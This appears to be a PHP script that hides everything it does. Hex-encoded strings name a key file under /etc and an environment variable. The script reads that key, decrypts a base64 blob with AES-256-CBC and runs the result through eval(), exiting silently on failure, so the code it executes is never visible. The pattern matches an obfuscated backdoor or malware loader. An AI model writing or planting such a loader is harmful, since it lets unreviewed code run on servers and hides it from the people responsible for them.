<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dBUTKY4qxPU/RGYfit4eEA==');

$c=base64_decode(

'UYicHbrIQB/IXqA//788V2PnvXgXH7erjrKmDqGVHR5SLa45VWbCNDbYsLDXBo7L1RZMRX6dNdi7' .
'GrP8e0S3FC+WIlBJ8p4E8y7Pc2tZA/gxpSYZHVpwvrMe7hcm0fhTxizXpllZWZx46vGE0XYt0Cgs' .
'bxwZ98P+tV4x5Vvs8Qsg8scymKojt+C1iYxAZt4o8bbp4KVBXBLIWGGI6lZPs+Bwh6sSZ6qmMTMp' .
'N56vnE17X+XcEo0Z0VvJUJMlHEAo0sGty/KBXxdfUAUGznIGjLUMEUOLwN2BshxqhmMeofc6wvfY' .
'IcZLw2AhGQNGCw8pALPzUabhajPVQMX4Zry53/ZW0EdkvSUm1dVx7VUo2czF7/qVZiOQDT+poewP' .
'u5tRvejeSg4CDGCQO1+2JBMXv8wiw8KuqiJQhk5LpdzOPjIpKRUngIR20Jt6ONDXykDyIv7S14U1' .
'BEbtB4/KM/zvW7EhDs8a6E8zVTdmzLv2m3zmXVRY54zaKSxKM4dSEdSjRqENCFQMFeeQZ4aaJrcx' .
'KiDRda/ZuPMP/Qhp2q6tG7KXDNo0MUbgbRMVPtXkNHwH0g6X/pAucnZfbvh/Z98jCHI+sg8+2Lu5' .
'bj/EcFkMOq/ab0L/bsuwX7JqvXwOfJJAOK9sUyy2Rif83dS8ERGMFBt+aPBd6ryqIQ1wowgS4Uak' .
'2cTQsmegkDOQA2cad5aX54eW9XvKDQgMrRk/gmWOahPSimTav7CqS4MQJCBaAhKiaIlNSbGIhxyZ' .
'A2WyPWAK6usd7p07ZpedMWpCcgrjvhYZlsjgkrOCaLTdvaS7zeoeaOcUerSoyAP+uDF7gTlwGSbT' .
'qva/8MBKimXv/VIm5lluxDPYCr0W8WHq8YHvcezbw5xiWfjttCZxA1caG3iVxQOQWUZFfJzyfYIe' .
'hejq4Foj+GAR6lsQU4ghfQGK51Po0SLTF+IKfXCteAugOnwL+4Sz0mgQVSYUlmDvvvbCEFxv8h1m' .
'YWriwwP9npH7KfiAKvXOgIzJB0Xl7ahOESSaytr6Ohr2fse+GtN0mDsomCx610t0xHxZqWR19PRR' .
'P1z9pCSFo8hwprj71iSd8npQrYheHraU9+9kPpnx3i9kI+3bZHf01/Y+se+FK33N3iwBX1c7psBK' .
'4+EJzQ/JcdyS9824rAWwL2202bjYQalCJPB/FNbp7iJOwELHZ1crpg3fgX3H0Qs+yvxqGxnjPk/s' .
'feZluBPavfVIrGJpLlWIXcodlGRrEFBCLCu9nHoDJHcjyhWm0t1Ca/hu/xAYLYW76dlgepVce7YW' .
'JW2x7Q0XL5LqtOBp5KkMlyy8p9tnKC5Eura79xL1Qo/f0IkRZzyhXK7zB1u8NYSZ3FxINqP+Vg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

